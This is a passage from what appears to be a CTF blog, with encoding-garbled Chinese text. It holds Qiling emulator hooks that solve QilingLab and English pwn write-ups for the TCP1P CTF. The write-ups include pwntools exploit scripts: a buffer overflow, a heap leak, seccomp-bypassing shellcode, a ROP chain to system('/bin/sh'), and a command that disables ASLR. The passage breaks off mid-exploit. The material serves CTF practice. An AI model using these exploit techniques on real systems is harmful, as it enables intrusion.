    # 00100d88 e1 03 01 91     add        x1,sp,#0x40
    # 00100d8c 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100d90 e0 3b 80 b9     ldrsw      x0,[sp, #local_1b8]
    # 00100d94 e2 23 07 91     add        x2,sp,#0x1c8
    # 00100d98 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100d9c 3f 00 00 6b     cmp        w1,w0

    sys_addr = ql.arch.regs.sp+0x40
    
    # print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
    
    ql.mem.write(sys_addr,b&amp;quot;QilingOS&amp;quot;)

    # 00100dd8 e1 0f 04 91     add        x1,sp,#0x103
    # 00100ddc 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100de0 e0 3f 80 b9     ldrsw      x0,[sp, #local_1b4]
    # 00100de4 e2 63 07 91     add        x2,sp,#0x1d8
    # 00100de8 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100dec 3f 00 00 6b     cmp        w1,w0

    version_addr = ql.arch.regs.sp+0x103
    
    # print(&amp;quot;version_addr: &amp;quot;,hex(version_addr))
    
    ql.mem.write(version_addr,b&amp;quot;ChallengeStart&amp;quot;)
    
def challenge2(ql):
    ql.os.set_syscall(&amp;quot;uname&amp;quot;,my_uname_on_exit_hook,QL_INTERCEPT.EXIT)
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge3&#34;&gt;challenge3:&lt;/h3&gt;
&lt;p&gt;ËØ•ÈÉ®ÂàÜÊåëÊàò‰ªé&lt;code&gt;/dev/urandom&lt;/code&gt;‰∏≠ÂÖàËØªÂÖ•&lt;code&gt;0x20&lt;/code&gt;‰∏™Â≠óËäÇÔºåÂÜçËØª1Â≠óËäÇ&lt;br&gt;
ÁÑ∂ÂêéË∞ÉÁî®&lt;code&gt;getrandom&lt;/code&gt;Ëé∑Âèñ&lt;code&gt;0x20&lt;/code&gt;Â≠óËäÇ&lt;br&gt;
ËøôÈáåÈúÄË¶ÅËÆ©&lt;code&gt;getrandom&lt;/code&gt;Ëé∑ÂèñÁöÑ&lt;code&gt;0x20&lt;/code&gt;Â≠óËäÇ‰∏é‰ªé&lt;code&gt;/dev/urandom&lt;/code&gt;ÁöÑ&lt;code&gt;0x20&lt;/code&gt;Â≠óËäÇÁõ∏Âêå‰∏î‰∏éÂºÄÂßãÁöÑ1Â≠óËäÇ‰∏çÂêå&lt;br&gt;
Êàë‰ª¨ËøôÈáåÈÄöËøáËá™ÂÆö‰πâÊñá‰ª∂ÂØπË±°ÂíåËá™Â∑±hook‰∏Ä‰∏™&lt;code&gt;getrandom&lt;/code&gt;Êù•ÂÆûÁé∞&lt;br&gt;
hookÂáΩÊï∞ÂØπÁÖßÂéüÂáΩÊï∞ÂÆûÁé∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1698638869071.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ëá™ÂÆö‰πâÊñá‰ª∂ÂØπË±°ÊòØÈÄöËøá&lt;code&gt;QlFsMappedObject&lt;/code&gt;ÂÆûÁé∞ÁöÑÔºåÂÖ∂‰∏≠Ëá≥Â∞ëÈúÄË¶Å‰∏Ä‰∏™&lt;code&gt;close()&lt;/code&gt;,ÂÖ∂‰ªñÁ≥ªÁªüË∞ÉÁî®Ê†πÊçÆÈúÄÊ±ÇÔºåËøôÈáåÊàë‰ª¨ÈúÄË¶Å‰ªé&lt;code&gt;/dev/urandom&lt;/code&gt;‰∏≠ËØªÂÖ•Êï∞ÊçÆÂà∞Ê†à‰∏äÔºåÊàë‰ª¨ÂèØ‰ª•Ëá™ÂÆö‰πâ‰∏Ä‰∏™&lt;code&gt;read&lt;/code&gt;ÁöÑÁ≥ªÁªüË∞ÉÁî®ÔºåÂå∫ÂàÜÂçïÁã¨ËØªÂÖ•1Â≠óËäÇÁöÑÊÉÖÂÜµ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class Fake_urandom(QlFsMappedObject):
    def read(self,size):
        if size == 1:
            return b&amp;quot;\x32&amp;quot;
        else:
            return b&amp;quot;\x00&amp;quot;*size
        
    def close(self):
        return 0
    
def getrandom_hook(ql,buf,size,flags):
    ql.mem.write(buf,b&amp;quot;\x00&amp;quot;*size)
    return 0
    
def challenge3(ql):
    ql.add_fs_mapper(&#39;/dev/urandom&#39;,Fake_urandom())
    ql.os.set_syscall(&amp;quot;getrandom&amp;quot;,getrandom_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge4&#34;&gt;challenge4Ôºö&lt;/h3&gt;
&lt;p&gt;Â¶ÇÂõæÔºåËØ•Âæ™ÁéØÊòØ‰∏çÊàêÁ´ãÁöÑÔºå‰∏∫‰∫ÜÂÆåÊàêchallenge4Êàë‰ª¨ÈúÄË¶ÅËøõÂÖ•Âæ™ÁéØ‰∏≠&lt;br&gt;
Êàë‰ª¨ÈÄöËøáhook cmpÊåá‰ª§Â§ÑÔºå‰Ωø&lt;code&gt;w0&amp;gt;0&lt;/code&gt;Âç≥ÂèØ&lt;br&gt;
Âú®ÊâßË°åcmpËøôÊù°Êåá‰ª§‰πãÂâçÊàë‰ª¨‰ºöË∞ÉÁî®hookÂáΩÊï∞ÔºåÊâÄ‰ª•ÊúÄÂêé&lt;code&gt;w0&amp;gt;0&lt;/code&gt;ÔºåÊàë‰ª¨‰πüÂæó‰ª•ËøõÂÖ•ËØ•Âæ™ÁéØ&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1698638877619.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_cmp_address(ql):
    ql.arch.regs.w0=1

def challenge4(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0xfe0
    ql.hook_address(hook_cmp_address,cmp_addr)

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge5&#34;&gt;challenge5:&lt;/h3&gt;
&lt;p&gt;Á¨¨‰∏Ä‰∏™Âæ™ÁéØËµãÂÄº&lt;br&gt;
ÈúÄË¶ÅÁªïËøáÁ¨¨‰∫å‰∏™Âæ™ÁéØÔºåÊúÄÁÆÄÂçïÊñπÊ≥ï‰Ωø&lt;code&gt;rand()&lt;/code&gt;ËøîÂõûÂÄº‰∏∫0Âç≥ÂèØ&lt;br&gt;
‰πãÂâçÊàë‰ª¨ÁöÑchallenge3ÊòØÂä´ÊåÅÁ≥ªÁªüË∞ÉÁî®ÔºåËØ•ÈÉ®ÂàÜÊàë‰ª¨Âä´ÊåÅÂ§ñÈÉ®ÂáΩÊï∞Ôºå‰ΩøÁî®&lt;code&gt;ql.os.set_api()&lt;/code&gt;Êù•Âä´ÊåÅ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def rand_hook(ql):
    ql.arch.regs.w0=0

def challenge5(ql):
    ql.os.set_api(&amp;quot;rand&amp;quot;,rand_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge6&#34;&gt;challenge6:&lt;/h3&gt;
&lt;p&gt;Ë∑≥Âá∫Ê≠ªÂæ™ÁéØÔºåË∑üchallenge4‰∏ÄÊ†∑Âú®cmp‰πãÂâçhook‰øÆÊîπÂØÑÂ≠òÂô®ÂÄºÂç≥ÂèØË∑≥Âá∫&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_cmp1_address(ql):
    ql.arch.regs.w0=0

def challenge6(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0x1118
    ql.hook_address(hook_cmp1_address,cmp_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge7&#34;&gt;challenge7:&lt;/h3&gt;
&lt;p&gt;Ë∑≥Âá∫&lt;code&gt;sleep(0xffffffff)&lt;/code&gt;&lt;br&gt;
Ë∑üchallenge5‰∏ÄÊ†∑ÔºåËØ•ÈÉ®ÂàÜÊàë‰ª¨Âè™ÈúÄÂä´ÊåÅ&lt;code&gt;sleep&lt;/code&gt;ÂáΩÊï∞Ë∞ÉÁî®Âç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def sleep_hook(ql,*args):
    ql.arch.regs.w0=0
    
def challenge7(ql):
    ql.os.set_api(&amp;quot;sleep&amp;quot;,sleep_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge8&#34;&gt;challenge8Ôºö&lt;/h3&gt;
&lt;p&gt;ËØ•ÈÉ®ÂàÜÈúÄË¶ÅÊàë‰ª¨Âêë&lt;code&gt;check&lt;/code&gt;‰∏äÂÜôÂÄºÔºåÁ°ÆÂÆöËØ•Âú∞ÂùÄÁöÑÊñπÊ≥ïÊòØÈÄöËøámagic_numÂéªÂØªÊâæ&lt;br&gt;
‰ΩøÁî®&lt;code&gt;ql.mem.search&lt;/code&gt;ÔºåÂ¶ÇÊûúÊâæÂà∞Â§ö‰∏™Âú∞ÂùÄÔºåÂàôÊ†πÊçÆÊú¨È¢òË∑ùÁ¶ª&lt;code&gt;magic_num_addr-0x8&lt;/code&gt;Â§ÑÁöÑÂ≠óÁ¨¶‰∏≤ÊòØÂê¶‰∏∫&amp;quot;Random data&amp;quot;Êù•Á°ÆÂÆöÔºåÂ§ßËá¥ÁªìÊûÑÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;quot;Random data&amp;quot;
magic_num
check
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def magic_hook(ql):
    magic=0x3dfcd6ea00000539
    magic_addrs=ql.mem.search(ql.pack64(magic))
    for i in magic_addrs:
        malloc_addr=i-0x8
        malloc_data=ql.mem.read(malloc_addr,24)
        string_addr,_,check_addr=struct.unpack(&#39;QQQ&#39;,malloc_data)
        ### Ëøô‰∏ÄË°åÂ∞Ü malloc_data ÂàÜÊàê 3‰∏™64‰Ωç8Â≠óËäÇÊó†Á¨¶Âè∑Êï¥Êï∞ ‰º†ÁªôÂâçÈù¢ÁöÑÂá†‰∏™ÂèòÈáè
        if ql.mem.string(string_addr) == &#39;Random data&#39;:
            ql.mem.write(check_addr,b&amp;quot;\x01&amp;quot;)
            break
        
def challnege8(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    hook_addr=base_addr+0x11e0
    ql.hook_address(magic_hook,hook_addr)    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge9&#34;&gt;challenge9:&lt;/h3&gt;
&lt;p&gt;‰ΩøÁî®&lt;code&gt;ql.os.set_api&lt;/code&gt;Êù•hookÂáΩÊï∞Ë∞ÉÁî®ÔºåËÆ©&lt;code&gt;tolower&lt;/code&gt;Â§±ÊïàÂç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def tolower_hook(ql,*args):
    return
    
def challenge9(ql):
    ql.os.set_api(&amp;quot;tolower&amp;quot;,tolower_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge10&#34;&gt;challenge10:&lt;/h3&gt;
&lt;p&gt;ËØ•ÈÉ®ÂàÜ‰ªé&lt;code&gt;/proc/self/cmdline&lt;/code&gt;ËØªÂÖ•Êï∞ÊçÆÂπ∂‰∏é&lt;code&gt;qilinglab&lt;/code&gt;ËøõË°åÊØîËæÉ&lt;br&gt;
Âä´ÊåÅÊñá‰ª∂Á≥ªÁªüÂç≥ÂèØÔºåÊ≥®ÊÑèËøîÂõûÂÄº‰∏∫&lt;code&gt;bytes&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class Fake_cmdline(QlFsMappedObject):
    def read(self,size):
        return b&amp;quot;qilinglab&amp;quot;
    
    def close(self):
        return 0
    
def challenge10(ql):
    ql.add_fs_mapper(&#39;/proc/self/cmdline&#39;,Fake_cmdline())
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge11&#34;&gt;challenge11:&lt;/h3&gt;
&lt;p&gt;ÂÜô‰∫Ü‰∏§ÁßçÊñπÊ≥ïÔºå‰∏ÄÁßçÊòØÂú®ÊåáÂÆöÂú∞ÂùÄÂ§Ñhook&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_lsr_address(ql):
    ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10

def challenge11(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    lsr_addr=base_addr+0x13f8
    ql.hook_address(hook_lsr_address,lsr_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËøòÊúâ‰∏ÄÁßçÊòØhookÊåá‰ª§ÔºåÂΩìËøêË°åÂà∞ËØ•Êù°Êåá‰ª§Êó∂(ÈÄöËøáÊú∫Âô®Á†ÅËØÜÂà´Êåá‰ª§)Ôºå‰ºöÁõ¥Êé•Âä´ÊåÅËØ•Êù°Êåá‰ª§&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_mrs_code(ql,address,size):
    if ql.mem.read(address,size) == b&amp;quot;\x00\x00\x38\xd5&amp;quot; :
        ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10
        ql.arch.regs.pc+=4
        

def challenge11_1(ql):
    ql.hook_code(hook_mrs_code)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Áî±‰∫éÊâÄÊúâËØ•Êåá‰ª§ÈÉΩÂ∞ÜË¢´Âä´ÊåÅÔºåÂ∏¶Êù•ÁöÑÊÄßËÉΩÂºÄÈîÄÊØîËæÉÂ§ßÔºå‰∏™‰∫∫ÊØîËæÉÈùíÁùêÁ¨¨‰∏ÄÁßçÊñπÊ≥ïÔºåÂç≥hookÂú∞ÂùÄ&lt;/p&gt;
&lt;h3 id=&#34;sum&#34;&gt;sumÔºö&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from qiling import *
from qiling.const import *
from qiling.os.mapper import QlFsMappedObject
import struct
import sys
from udbserver import udbserver

def challenge1(ql):  
    ql.mem.map(0x1000,0x1000,info=&#39;challenge1&#39;) #Ê≥®ÊÑèÂÜÖÂ≠òÈ°µÂØπÈΩê
    ql.mem.write(0x1337,ql.pack64(1337))


def my_uname_on_exit_hook(ql,*args):
#     struct utsname {
#     char sysname[65];
#     char nodename[65];
#     char release[65];   
#     char version[65];
#     char machine[65];
#     char domainname[65];
# };

    # 00100d88 e1 03 01 91     add        x1,sp,#0x40
    # 00100d8c 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100d90 e0 3b 80 b9     ldrsw      x0,[sp, #local_1b8]
    # 00100d94 e2 23 07 91     add        x2,sp,#0x1c8
    # 00100d98 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100d9c 3f 00 00 6b     cmp        w1,w0

    sys_addr = ql.arch.regs.sp+0x40
    
    # print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
    
    ql.mem.write(sys_addr,b&amp;quot;QilingOS&amp;quot;)

    # 00100dd8 e1 0f 04 91     add        x1,sp,#0x103
    # 00100ddc 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100de0 e0 3f 80 b9     ldrsw      x0,[sp, #local_1b4]
    # 00100de4 e2 63 07 91     add        x2,sp,#0x1d8
    # 00100de8 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100dec 3f 00 00 6b     cmp        w1,w0

    version_addr = ql.arch.regs.sp+0x103
    
    # print(&amp;quot;version_addr: &amp;quot;,hex(version_addr))
    
    ql.mem.write(version_addr,b&amp;quot;ChallengeStart&amp;quot;)
    
def challenge2(ql):
    ql.os.set_syscall(&amp;quot;uname&amp;quot;,my_uname_on_exit_hook,QL_INTERCEPT.EXIT)
    

class Fake_urandom(QlFsMappedObject):
    def read(self,size):
        if size == 1:
            return b&amp;quot;\x32&amp;quot;
        else:
            return b&amp;quot;\x00&amp;quot;*size
        
    def close(self):
        return 0
    
def getrandom_hook(ql,buf,size,flags):
    ql.mem.write(buf,b&amp;quot;\x00&amp;quot;*size)
    return 0
    
def challenge3(ql):
    ql.add_fs_mapper(&#39;/dev/urandom&#39;,Fake_urandom())
    ql.os.set_syscall(&amp;quot;getrandom&amp;quot;,getrandom_hook)

def hook_cmp_address(ql):
    ql.arch.regs.w0=1

def challenge4(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0xfe0
    ql.hook_address(hook_cmp_address,cmp_addr)

def rand_hook(ql):
    ql.arch.regs.w0=0

def challenge5(ql):
    ql.os.set_api(&amp;quot;rand&amp;quot;,rand_hook)

def hook_cmp1_address(ql):
    ql.arch.regs.w0=0

def challenge6(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0x1118
    ql.hook_address(hook_cmp1_address,cmp_addr)

def sleep_hook(ql,*args):
    ql.arch.regs.w0=0
    
def challenge7(ql):
    ql.os.set_api(&amp;quot;sleep&amp;quot;,sleep_hook)

def magic_hook(ql):
    magic=0x3dfcd6ea00000539
    magic_addrs=ql.mem.search(ql.pack64(magic))
    for i in magic_addrs:
        malloc_addr=i-0x8
        malloc_data=ql.mem.read(malloc_addr,24)
        string_addr,_,check_addr=struct.unpack(&#39;QQQ&#39;,malloc_data)
        ### Ëøô‰∏ÄË°åÂ∞Ü malloc_data ÂàÜÊàê 3‰∏™64‰Ωç8Â≠óËäÇÊó†Á¨¶Âè∑Êï¥Êï∞ ‰º†ÁªôÂâçÈù¢ÁöÑÂá†‰∏™ÂèòÈáè
        if ql.mem.string(string_addr) == &#39;Random data&#39;:
            ql.mem.write(check_addr,b&amp;quot;\x01&amp;quot;)
            break
        
def challnege8(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    hook_addr=base_addr+0x11e0
    ql.hook_address(magic_hook,hook_addr)            

def tolower_hook(ql,*args):
    return
    
def challenge9(ql):
    ql.os.set_api(&amp;quot;tolower&amp;quot;,tolower_hook)

class Fake_cmdline(QlFsMappedObject):
    def read(self,size):
        return b&amp;quot;qilinglab&amp;quot;
    
    def close(self):
        return 0
    
def challenge10(ql):
    ql.add_fs_mapper(&#39;/proc/self/cmdline&#39;,Fake_cmdline())

def hook_lsr_address(ql):
    ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10

def challenge11(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    lsr_addr=base_addr+0x13f8
    ql.hook_address(hook_lsr_address,lsr_addr)
    
def hook_mrs_code(ql,address,size):
    if ql.mem.read(address,size) == b&amp;quot;\x00\x00\x38\xd5&amp;quot; :
        ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10
        ql.arch.regs.pc+=4
        

def challenge11_1(ql):
    ql.hook_code(hook_mrs_code)


if __name__ == &amp;quot;__main__&amp;quot;:
    path=[&#39;qilinglab-aarch64&#39;]
    rootfs=&amp;quot;../../rootfs/arm64_linux&amp;quot;
    ql=Qiling(path,rootfs,verbose=QL_VERBOSE.OFF)

    # udbserver(ql.uc,1234,0)
    
    challenge1(ql)
    challenge2(ql)
    challenge3(ql)
    challenge4(ql)
    challenge5(ql)
    challenge6(ql)
    challenge7(ql)
    challnege8(ql)
    challenge9(ql)
    challenge10(ql)
    challenge11(ql)
    # challenge11_1(ql)
    
    ql.run()
    
&lt;/code&gt;&lt;/pre&gt;
">qiling_lab_aarch64</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/UPbwsdUDa/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN:&lt;/h3&gt;
&lt;h4 id=&#34;bluffer-overflow&#34;&gt;bluffer Overflow:&lt;/h4&gt;
&lt;p&gt;provide us with c source code,just use gcc to compile and the offset to the addr we need to write was &lt;code&gt;0x14&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,17027)
# elf=ELF(&amp;quot;./chall&amp;quot;)

payload=b&amp;quot;\x00&amp;quot;*0x14+p64(0x4e5750)
io.sendlineafter(b&amp;quot;Input: &amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;babyheap&#34;&gt;babyheap:&lt;/h4&gt;
&lt;p&gt;when we call &lt;code&gt;read_flag&lt;/code&gt;, it will &lt;code&gt;malloc(0x70)*7&lt;/code&gt;&lt;br&gt;
just make sure u have spare tcachebin before u call &lt;code&gt;read_flag&lt;/code&gt;&lt;br&gt;
then u can leak flag by &lt;code&gt;view&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,4267)
elf=ELF(&amp;quot;./chall&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()    

for i in range(1,7):
    add(i,0x70,b&amp;quot;aaa&amp;quot;)

for i in range(1,7):
    delete(i)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)

show(2)
    
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;message&#34;&gt;message:&lt;/h4&gt;
&lt;p&gt;program run our shellcode with seccomp rules added&lt;br&gt;
&lt;code&gt;seccomp-tools dump ./chall&lt;/code&gt; and we get&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/ÊñáÊ°£/match/tcp1p/message$ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &amp;lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x000000d9  if (A != getdents64) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;which allows &lt;code&gt;getdents64,open,read,write&lt;/code&gt;&lt;br&gt;
the flag name was not &lt;code&gt;flag&lt;/code&gt; anymore,we need to use &lt;code&gt;getdents64&lt;/code&gt; to list all files in current directory&lt;br&gt;
then normal orw shellcode is ok&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,8008)

# gdb.attach(io.pid)
# pause()

io.recvuntil(b&amp;quot;me? \n&amp;quot;)

# list current directory files
# payload = asm(&#39;mov rsp,QWORD PTR fs:[0]&#39;)
# payload += asm(shellcraft.open(&#39;.&#39;))
# payload += asm(shellcraft.getdents64(3, &#39;rsp&#39;, 0x500))
# payload += asm(shellcraft.write(1, &#39;rsp&#39;, 0x500))

# orw flag
payload=asm(shellcraft.open(&amp;quot;flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt&amp;quot;))
payload+=asm(shellcraft.read(3,&#39;rsp&#39;,0x100))
payload+=asm(shellcraft.write(1,&#39;rsp&#39;,0x100))


io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gamechanger&#34;&gt;gamechanger:&lt;/h4&gt;
&lt;p&gt;pie enabled,full relro&lt;br&gt;
ezbypass the random number&lt;/p&gt;
&lt;p&gt;then we have a chance to overflowÔºåthe first time we could partial write the ret addr&lt;br&gt;
made it to  &lt;code&gt;_start&lt;/code&gt; ,meanwhile ,due to the &lt;code&gt;printf&lt;/code&gt; we could leak the base addr at the same time&lt;/p&gt;
&lt;p&gt;the second time we enter &lt;code&gt;ask&lt;/code&gt; ,we overflow the ret addr to &lt;code&gt;puts&lt;/code&gt; func,this could print the addr of &lt;code&gt;__funlockfile&lt;/code&gt; ,which we can infer libc base according to this ,ret addr+0x8 to &lt;code&gt;ask&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;as we got all the addr we need,then the last time we just use normal rop&lt;br&gt;
I&#39;ve tried ogg but it doesn&#39;t work on my local&lt;br&gt;
and one thing to mention,if you just use &lt;code&gt;libc_addr+libc.sym[b&amp;quot;system&amp;quot;]&lt;/code&gt; as the addr of &lt;code&gt;system&lt;/code&gt;, you probably can&#39;t get shell at last, I guess maybe it&#39;s because stack alighment problem, so we just add &lt;code&gt;0x1b&lt;/code&gt; as offset to call &lt;code&gt;do_system&lt;/code&gt; directly&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;0x7ffff7c50d7b &amp;lt;system+27&amp;gt;    call   do_system                &amp;lt;do_system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;disturbing when it doesn&#39;t provide any info about the libc&lt;br&gt;
however we can just leak from remote and infer&lt;/p&gt;
&lt;p&gt;and I just use the following when debugging, it&#39;s annoying to meet the 1/16 when dealing with the aslr&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo su
echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./gamechanger&amp;quot;)
# io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,9254)
elf=ELF(&amp;quot;./gamechanger&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
libc=elf.libc

io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

io.recvuntil(b&amp;quot;100\n&amp;quot;)
now = int((time.time()))
cs.srand(now)
io.sendline(str((cs.rand()+0x22)%0x17))

# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x104)+b&amp;quot;nmsl&amp;quot;+b&amp;quot;\x10\x51&amp;quot;
io.send(payload)

io.recvuntil(b&amp;quot;nmsl&amp;quot;)
base_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x1110
pop_rbp=base_addr+0x11e3
ret=base_addr+0x1016
read_text=base_addr+0x1060
leave_ret=base_addr+0x1358
puts_plt=base_addr+elf.plt[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))


##############


io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

io.recvuntil(b&amp;quot;100\n&amp;quot;)
now = int((time.time()))
cs.srand(now)
io.sendline(str((cs.rand()+0x22)%0x17))

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x108)+p64(base_addr+elf.sym[b&amp;quot;puts&amp;quot;])+p64(base_addr+0x135a)
io.send(payload)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x620d0
print(&amp;quot;leak_addr: &amp;quot; +hex(leak_addr))

shell=leak_addr+0xebdb3
pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

####### 
# io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

# io.recvuntil(b&amp;quot;100\n&amp;quot;)
# now = int((time.time()))
